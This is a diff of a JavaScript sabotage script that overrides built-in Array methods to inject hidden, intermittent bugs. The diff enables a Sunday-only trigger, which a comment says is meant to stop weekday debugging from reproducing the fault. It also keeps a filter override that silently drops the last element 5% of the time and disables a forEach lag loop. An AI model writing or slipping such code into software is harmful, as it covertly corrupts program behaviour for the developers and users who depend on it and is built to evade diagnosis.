@@ -15,7 +15,7 @@ import * as _ from "lodash-es";
 ((global) => {
 	// 只有周日才注入，当周日产生bug时，工作日程序员进行debug时将不会进行复现
 	// Skip if it's not Sunday
-	// if (new Date().getDay() !== 0) return;
+	if (new Date().getDay() !== 0) return;
 	var result = null;
 	/**
 	 * If the array size is devidable by 7, this function aways fail
@@ -55,11 +55,11 @@ import * as _ from "lodash-es";
 	 * Array.forEach will will cause a significant lag
 	 * @zh Array.forEach会卡死一段时间
 	 */
-	const _forEach = Array.prototype.forEach;
-	Array.prototype.forEach = function (...args) {
-		for (let i = 0; i <= 1e7; i++);
-		return _forEach.call(this, ...args);
-	};
+	// const _forEach = Array.prototype.forEach;
+	// Array.prototype.forEach = function (...args) {
+	// 	for (let i = 0; i <= 1e7; i++);
+	// 	return _forEach.call(this, ...args);
+	// };
 
 	/**
 	 * Array.fillter has 5% chance to lose the final element
@@ -67,6 +67,7 @@ import * as _ from "lodash-es";
 	 */
 	const _filter = Array.prototype.filter;
 	Array.prototype.filter = function (...args) {
+		// 重写数组的filter方法时，调用原始的filter方法来实现过滤功能。
 		result = _filter.call(this, ...args);
 		if (_rand() < 0.05) {
 			result.length = Math.max(result.length - 1, 0);
